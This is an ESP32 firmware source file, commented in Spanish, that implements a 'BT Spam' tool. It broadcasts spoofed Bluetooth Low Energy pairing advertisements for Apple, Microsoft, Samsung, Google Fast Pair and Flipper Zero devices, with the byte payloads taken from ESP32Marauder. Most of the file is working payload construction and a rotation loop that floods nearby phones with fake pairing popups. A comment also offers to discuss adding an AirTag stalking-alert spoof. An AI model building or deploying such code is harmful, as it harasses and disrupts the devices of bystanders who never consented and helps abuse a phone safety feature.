#include "Apps/screen_btspam.h"
#include "Drivers/buzzer.h"
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <esp_random.h>

static const unsigned char image_Layer_9_bits[] PROGMEM = {
  0x7e,0x7e,0x7e,0x7e,0x99,0x99,0x99,0x99,
  0x67,0xe6,0x67,0xe6,0x18,0x18,0x18,0x18,
  0x67,0xe6,0x67,0xe6,0x99,0x99,0x99,0x99,
  0x7e,0x7e,0x7e,0x7e
};

// ---------------------------------------------------------------------
//  BT Spam v2 -- basado en la tecnica real de ESP32Marauder
//  (justcallmekoko/ESP32Marauder, WiFiScan.cpp::GetUniversalAdvertisementData
//  y ::executeBLESpam), no en un formato inventado.
//
//  Mas fabricantes ademas de Apple: Microsoft (Swift Pair), Samsung
//  (Galaxy Buds), Google (Fast Pair) y Flipper Zero, con los bytes tal
//  cual los arma Marauder (Company ID + estructura de cada fabricante),
//  no inventados. Rota de fabricante cada ROTATE_INTERVAL_MS.
//
//  MAC address: Marauder randomiza la MAC en CADA paquete via
//  esp_base_mac_addr_set() + un ciclo deinit/init. Se probo aca y
//  crashea en hardware real (ESP32-C6, arduino-esp32 3.3.11) con
//  "Guru Meditation Error / Store access fault" -- y no es un problema
//  de frecuencia ni de timing entre deinit/init: crashea incluso
//  llamando esp_base_mac_addr_set() una sola vez, antes del PRIMER
//  init() de toda la sesion (se ve tambien como
//  "ble_store_config_write_local_irk rc=27" /
//  "ble_store_util_status_rr rc=17" en el log serial justo antes del
//  panic). O sea: esp_base_mac_addr_set() en si mismo es incompatible
//  con el almacenamiento de bonding/identidad de este puerto de NimBLE
//  en este chip+core, no importa cuando se llame. Por eso aca se saco
//  la randomizacion de MAC por completo -- el dispositivo anuncia con
//  su MAC de fabrica de toda la vida. Se pierde el "cada sesion con
//  una MAC distinta" de Marauder, pero es lo que permite que esto
//  funcione sin crashear.
//
//  OJO -- que quede claro que NO se porto todo Marauder: el tipo
//  "Airtag" del codigo original (que hace que el celular de alguien
//  muestre la alerta de seguridad "Es posible que te esten siguiendo")
//  se dejo AFUERA a proposito. Eso ya no es una simple travesura de
//  popup de emparejamiento, es abusar de una funcion de seguridad
//  anti-stalking real -- si te interesa igual esa parte, pedimelo
//  aparte y lo hablamos.
//
//  Los bytes de cada fabricante se tomaron del repo publico de
//  Marauder pero solo se probo en hardware real el flujo de
//  init/rotacion/stop de este archivo -- si algun tipo puntual no
//  dispara popup, avisame para revisar ese payload especifico.
// ---------------------------------------------------------------------

enum SpamType { SPAM_APPLE, SPAM_MICROSOFT, SPAM_SAMSUNG, SPAM_GOOGLE, SPAM_FLIPPER, SPAM_TYPE_COUNT };
static const char* TYPE_NAMES[SPAM_TYPE_COUNT] = {
  "Apple", "Microsoft", "Samsung", "Google Fast Pair", "Flipper Zero"
};

static const unsigned long ROTATE_INTERVAL_MS = 1000; // Marauder throttlea "Sour Apple" a 1s

static BLEAdvertising* pAdvertising = nullptr;
static bool           spamming     = false;
static int            currentType  = 0;
static unsigned long  lastRotate   = 0;
static uint32_t       packetsSent  = 0;

static uint8_t rnd8() { return (uint8_t)(esp_random() & 0xFF); }

static void randomName(char* out, uint8_t len) {
  static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  for (uint8_t i = 0; i < len; i++) out[i] = charset[rnd8() % (sizeof(charset) - 1)];
  out[len] = '\0';
}

// ---------- Payloads (bytes tal cual Marauder, GetUniversalAdvertisementData) ----------

static void addApplePacket(BLEAdvertisementData &adv) {
  if (rnd8() % 10 != 0) {
    // "Accion" (Handoff/AirDrop) -- popup mas chico y rapido
    uint8_t raw[11];
    int i = 0;
    raw[i++] = 0x0A; raw[i++] = 0xFF; raw[i++] = 0x4C; raw[i++] = 0x00;
    raw[i++] = 0x0F; raw[i++] = 0x05; raw[i++] = 0xC0;
    static const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2f, 0x01, 0x06, 0x20};
    raw[i++] = types[rnd8() % (sizeof(types))];
    raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8();
    adv.addData((char*)raw, sizeof(raw));
  } else {
    // "Dispositivo" (AirPods/Watch/etc) -- el cartel grande de "Conectar"
    uint8_t raw[21];
    int i = 0;
    raw[i++] = 0x14; raw[i++] = 0xFF; raw[i++] = 0x4C; raw[i++] = 0x00;
    raw[i++] = 0x07; raw[i++] = 0x0F; raw[i++] = 0x00;
    static const uint16_t models[] = {
      0x0220, 0x0F20, 0x1320, 0x1420, 0x0E20, 0x0A20, 0x0055, 0x0C20,
      0x1120, 0x0520, 0x1020, 0x0920, 0x1720, 0x1220, 0x1620
    };
    uint16_t model = models[rnd8() % (sizeof(models) / sizeof(models[0]))];
    raw[i++] = (uint8_t)(model >> 8);
    raw[i++] = (uint8_t)(model & 0xFF);
    raw[i++] = 0xAC; raw[i++] = 0x90; raw[i++] = 0x85; raw[i++] = 0x75; raw[i++] = 0x94; raw[i++] = 0x65;
    raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8();
    raw[i++] = 0x00;
    adv.addData((char*)raw, sizeof(raw));
  }
}

static void addMicrosoftPacket(BLEAdvertisementData &adv) {
  char name[6];
  randomName(name, 5);
  uint8_t total = 7 + 5;
  uint8_t raw[12];
  int i = 0;
  raw[i++] = total - 1;
  raw[i++] = 0xFF; raw[i++] = 0x06; raw[i++] = 0x00; raw[i++] = 0x03; raw[i++] = 0x00; raw[i++] = 0x80;
  memcpy(&raw[i], name, 5);
  i += 5;
  adv.addData((char*)raw, total);
}

static void addSamsungPacket(BLEAdvertisementData &adv) {
  uint8_t raw[15];
  int i = 0;
  raw[i++] = 14; raw[i++] = 0xFF; raw[i++] = 0x75; raw[i++] = 0x00;
  raw[i++] = 0x01; raw[i++] = 0x00; raw[i++] = 0x02; raw[i++] = 0x00; raw[i++] = 0x01;
  raw[i++] = 0x01; raw[i++] = 0xFF; raw[i++] = 0x00; raw[i++] = 0x00; raw[i++] = 0x43;
  raw[i++] = rnd8(); // "modelo/color" -- Marauder usa una tabla real de watch models, aca va random
  adv.addData((char*)raw, sizeof(raw));
}

static void addGooglePacket(BLEAdvertisementData &adv) {
  uint8_t raw[14];
  int i = 0;
  raw[i++] = 3; raw[i++] = 0x03; raw[i++] = 0x2C; raw[i++] = 0xFE;
  raw[i++] = 6; raw[i++] = 0x16; raw[i++] = 0x2C; raw[i++] = 0xFE;
  raw[i++] = 0x00; raw[i++] = 0xB7; raw[i++] = 0x27;
  raw[i++] = 2; raw[i++] = 0x0A;
  raw[i++] = (uint8_t)((rnd8() % 120) - 100); // -100 a +19 dBm, TX power falso
  adv.addData((char*)raw, sizeof(raw));
}

static void addFlipperPacket(BLEAdvertisementData &adv) {
  char name[6];
  randomName(name, 5);
  uint8_t raw[24];
  int i = 0;
  raw[i++] = 0x02; raw[i++] = 0x01; raw[i++] = 0x06;
  raw[i++] = 0x06; raw[i++] = 0x09;
  memcpy(&raw[i], name, 5);
  i += 5;
  raw[i++] = 0x03; raw[i++] = 0x02; raw[i++] = (uint8_t)(0x80 + (rnd8() % 3) + 1); raw[i++] = 0x30;
  raw[i++] = 0x02; raw[i++] = 0x0A; raw[i++] = 0x00;
  raw[i++] = 0x05; raw[i++] = 0xFF; raw[i++] = 0xBA; raw[i++] = 0x0F;
  raw[i++] = 0x4C; raw[i++] = 0x75; raw[i++] = 0x67; raw[i++] = 0x26; raw[i++] = 0xE1; raw[i++] = 0x80;
  adv.addData((char*)raw, i);
}

// ---------- Emitir un paquete (sin tocar el stack BLE) ----------

// La rotacion entre fabricantes solo cambia los datos del advertising
// (stop + setAdvertisementData + start), sin volver a inicializar el
// stack BLE -- eso es seguro hacer en caliente. Lo que se saco por
// completo es la randomizacion de MAC (ver nota arriba de todo el
// archivo): no hay ningun deinit/init de por medio en esta rotacion.
static void applyPacket(int type) {
  BLEAdvertisementData advData;
  switch (type) {
    case SPAM_APPLE:     addApplePacket(advData);     break;
    case SPAM_MICROSOFT: addMicrosoftPacket(advData); break;
    case SPAM_SAMSUNG:   addSamsungPacket(advData);   break;
    case SPAM_GOOGLE:    addGooglePacket(advData);    break;
    case SPAM_FLIPPER:   addFlipperPacket(advData);   break;
  }
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();

  packetsSent++;
}

static void startSpam() {
  if (spamming) return;

  // Sin randomizacion de MAC (ver nota arriba de todo el archivo) --
  // se anuncia con la MAC BLE de fabrica del chip.

  // El radio 2.4GHz es compartido entre WiFi y BLE en este chip: si
  // quedo algo de WiFi encendido de otra pantalla, se apaga aqui para
  // no pelear con el controlador de BLE.
  WiFi.mode(WIFI_OFF);

  BLEDevice::init("");
  pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->setScanResponse(false);

  currentType = 0;
  applyPacket(currentType);

  spamming    = true;
  lastRotate  = millis();
  packetsSent = 0;
  Serial.println(F("BT Spam: iniciado"));
}

static void stopSpam() {
  if (!spamming) return;

  if (pAdvertising) pAdvertising->stop();
  // deinit(false) -- NO libera la memoria del controlador BT. Con
  // deinit(true) el siguiente init() crasheaba (ver nota arriba);
  // sacrifica poder cambiar de modo BT/BLE, pero es estable para
  // simplemente prender/apagar el advertising varias veces.
  BLEDevice::deinit(false);

  spamming = false;
  Serial.println(F("BT Spam: detenido"));
}

// ---------- Botones ----------

static bool isButtonJustPressed(int pin) {
  static uint8_t lastStableState[4] = {HIGH, HIGH, HIGH, HIGH};
  static uint8_t lastReading[4]     = {HIGH, HIGH, HIGH, HIGH};
  static unsigned long lastDebounceTime[4] = {0, 0, 0, 0};

  const int pins[4] = {PIN_SELECT, PIN_UP, PIN_DOWN, PIN_BACK};
  int index = -1;

  for (int i = 0; i < 4; i++) {
    if (pins[i] == pin) { index = i; break; }
  }
  if (index == -1) return false;

  uint8_t reading = digitalRead(pin);

  if (reading != lastReading[index]) {
    lastDebounceTime[index] = millis();
    lastReading[index] = reading;
  }

  if ((millis() - lastDebounceTime[index]) > 50) {
    if (lastStableState[index] == HIGH && reading == LOW) {
      lastStableState[index] = reading;
      return true;
    }
    lastStableState[index] = reading;
  }
  return false;
}

// ---------- Pantalla ----------

void screenBtSpamLoop() {
  // Rota de fabricante cada ROTATE_INTERVAL_MS. Ya NO reinicia el stack
  // BLE (ver nota en applyPacket/startSpam) -- solo cambia los datos
  // del advertising, que es seguro hacer en caliente.
  if (spamming && millis() - lastRotate >= ROTATE_INTERVAL_MS) {
    lastRotate = millis();
    pAdvertising->stop();
    currentType = (currentType + 1) % SPAM_TYPE_COUNT;
    applyPacket(currentType);
  }

  if (isButtonJustPressed(PIN_BACK)) {
    buzzerClick();
    if (spamming) stopSpam();
    currentScreen = SCREEN_APPS;
    return;
  }

  if (isButtonJustPressed(PIN_SELECT)) {
    buzzerBeep();
    if (spamming) stopSpam();
    else          startSpam();
  }

  u8g2.clearBuffer();
  u8g2.setFontMode(1);
  u8g2.setBitmapMode(1);
  u8g2.setFont(u8g2_font_6x10_tr);

  u8g2.setDrawColor(1);
  u8g2.drawBox(16, 1, 96, 14);
  u8g2.setDrawColor(2);
  u8g2.drawStr(43, 11, "BT Spam");
  u8g2.setDrawColor(1);

  u8g2.drawXBM(0, 1, 16, 14, image_Layer_9_bits);
  u8g2.drawXBM(112, 1, 16, 14, image_Layer_9_bits);

  char line[24];

  if (spamming) {
    u8g2.drawDisc(10, 21, 3);
    u8g2.drawStr(16, 25, "ON");
  } else {
    u8g2.drawCircle(10, 21, 3);
    u8g2.drawStr(16, 25, "OFF");
  }
  snprintf(line, sizeof(line), "%lu pkts", (unsigned long)packetsSent);
  u8g2.drawStr(80, 25, line);

  u8g2.setFont(u8g2_font_5x7_tr);
  if (spamming) {
    u8g2.drawStr(6, 40, TYPE_NAMES[currentType]);
  } else {
    u8g2.drawStr(6, 39, "Listo para anunciar");
  }

  u8g2.drawStr(6, 62, "BACK: Salir");
  u8g2.drawStr(6, 52, "SEL: Iniciar");

  u8g2.sendBuffer();
}
